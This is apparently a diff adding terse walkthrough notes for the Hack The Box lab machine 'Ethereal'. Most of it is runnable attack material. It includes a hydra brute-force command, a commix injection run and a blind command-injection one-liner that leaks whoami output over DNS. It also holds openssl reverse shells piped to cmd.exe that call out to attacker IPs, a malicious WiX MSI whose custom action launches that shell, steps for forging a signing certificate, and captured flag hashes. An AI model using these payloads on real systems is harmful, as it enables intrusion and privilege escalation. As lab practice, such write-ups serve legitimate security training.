@@ -1,0 +1,150 @@
+DOWNLAOD EVERYTHING FROM FTP SERVER
+binary
+mget FDISK.zip
+mget DISK1
+mget DISK2
+etcetera
+
+RUN PBOX
+MOUNT FDISK
+mkdir ./mnt && mkdir ./mnt/FDISK && mount -o loop FDISK ./mnt/FDISK
+
+apt-get install dosbox
+GET REQUIRED CWSDPMI FILE
+https://www.dosgames.com/files/cwsdpmi.zip
+dosbox cwsdpmi.exe
+cd to /pbox folder
+enter command pbox
+enter password password 
+
+USE PASSWORD LIST TO BRUTE LOGIN ON 8080
+hydra -L pbox_credentials.txt -P pbox_credentials.txt http-get://ethereal.htb:8080
+username alan
+password !C414m17y57r1k3s4g41n!
+
+EDIT /etc/hosts to include
+10.10.10.106    ETHEREAL.HTB
+http://10.10.10.106:8080
+Log in using above credentials
+
+CHECK FOR RCE
+commix --batch --retries=9999 --all --os='Windows' --auth-type=basic --auth-cred='alan:!C414m17y57r1k3s4g41n!' --data="__EVENTVALIDATION=/wEdAAPXNrMskvPvtGY7odd1gNQQ4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p%2B9jPAN/80m0Jg7tyLIuniHLLNMkjX2uEzelj9mmG0qvEBTnS/w==&search=localhost&ctl02=" -p "search" --level=3 -u http://ethereal.htb:8080/?guest=1
+
+CATCH PACKETS WITH WIRESHARK
+In ping box enter
+|| for /f "tokens=1" %i in ('whoami') do nslookup %i 10.10.14.144
+This is a blind RCE
+
+CHECK FIREWALL RULES
+netsh advfirewall firewall show rule name=all
+port 73 and 136 are open
+openssl.exe is installed
+
+CREATE A KEY
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+
+COMMAND SENDER TERMIAL WINDOW
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+
+COMMAND RESPONSE TEMRINAL WINDOW
+openssl s_server -quiet -key key.pem -cert cert.pem -port 136
+
+USE PING IN WEB APP OR EXECUTE CURL COMMAND TO RUN THE POST OF THIS COMMAND THROUGH ADMIN WEBAPP
+10.10.14.15 | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.15:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.6:136
+
+SEND COMMANDS in SEND TERMINAL
+USE CURL IN 3RD TERMINAL
+SEE RESPONSE IN 2ND TERMINAL
+
+ENUMERATE THIS FILE
+C:\Users\Public\Desktop\note-draft.txt
+I've created a shortcut for VS on the Public Desktop to ensure we use the same
+version. Please delete any existing shortcuts and use this one instead.
+- Alan
+
+FILES CAN BE WRITTEN HERE
+C:\Users\Public\Desktop\Shortcuts\VB.lnk
+
+UPLOAD FILES USING
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73 < VB.lnk
+
+10.10.14.15 | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.15:73 > C:\Users\Public\Desktop\Shortcuts\VB.lnk
+
+USE LNKUP TO GENERATE A .lnk FILE
+https://github.com/Plazmaz/LNKUp
+
+C:\Users\jorge\Desktop\cat user.txt
+2b9a4ca09408b4a39d87cbcd7bd524dd
+
+cat D:\DEV\MSIs\note.txt
+Tells us to create a malicous msi file
+
+USE WIX TOOLS SET
+http://wixtoolset.org/releases/
+
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product
+Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
+<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer
+Package"/>
+<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
+<Directory Id="TARGETDIR" Name="SourceDir">
+<Directory Id="ProgramFilesFolder">
+<Directory Id="INSTALLLOCATION" Name="Example">
+<Component
+Id="ApplicationFiles"
+Guid="12345678-1234-1234-1234-222222222222">
+<File Id="ApplicationFile1" Source="D:\Windows\tracing\test.txt"/>
+</Component>
+</Directory>
+</Directory>
+</Directory>
+<Feature Id="DefaultFeature" Level="1">
+<ComponentRef Id="ApplicationFiles"/>
+</Feature>
+<CustomAction Id="SystemShell" Directory="TARGETDIR" ExeCommand="cmd.exe /c
+C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.6:73| cmd.exe |
+C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe
+s_client
+-quiet
+-connect
+10.10.14.6:136"
+Execute="deferred" Impersonate="yes" Return="ignore"/>
+<CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check">
+invalid vbs to fail install
+</CustomAction>
+<InstallExecuteSequence>
+<Custom Action="SystemShell" After="InstallInitialize"></Custom>
+<Custom Action="FailInstall" Before="InstallFiles"></Custom>
+</InstallExecuteSequence>
+</Product>
+</Wix>
+
+USE CANDLE.EXE WITH THE EXPLOIT ABOVE
+then light.exe payload.wixobj which creates the compiled payload.msi
+Download the certs rupal mentioned in his note and sign malicious .msi
+The certs were in the D:\certs folder, MyCA.cer and MyCA.pvk
+pvk2pfx -pvk C:\temp\MyCa.pvk -spc C:\temp\MyCa.cer -pfx C:\temp\MyCa.pfx
+
+CREATES NEW CERTS FOR SIGNING
+makecert -pe -n "CN=My SPC" -a sha256 -cy end -sky signature -ic
+C:\temp\MyCA.cer -iv c:\temp\MyCA.pvk -sv C:\temp\MySPC.pvk c:\temp\MySPC.cer
+
+CREATES OWN PFX CERT
+pvk2pfx -pvk C:\temp\MySPC.pvk -spc C:\temp\MySPC.cer -pfx C:\temp\MySPC.pfx
+
+SIGN THE PAYLOAD
+signtool sign /v /n "Me" /s SPC C:\file.msi
+
+Uploaded payload msi to C:\windows\tracing
+Copy to D:\DEV\MSIs folder as needed.
+When an msi file is uploaded to the D:\DEV\MSIs folder, every few minutes rupal “tests”
+the file and then deletes all msi files in D:\DEV\MSIs
+As soon as the msi file is copied with the openssl command, quickly exit out of the openssl connection as jorge
+Enter the openssl command to wait for a connection again on port 73 and then type or paste in a command to be run as rupal.
+
+type C:\Users\rupal\Desktop\root.txt
+root.txt
+1cb6f1fc220e3f2fcc0e3cd8e2d9906f
+
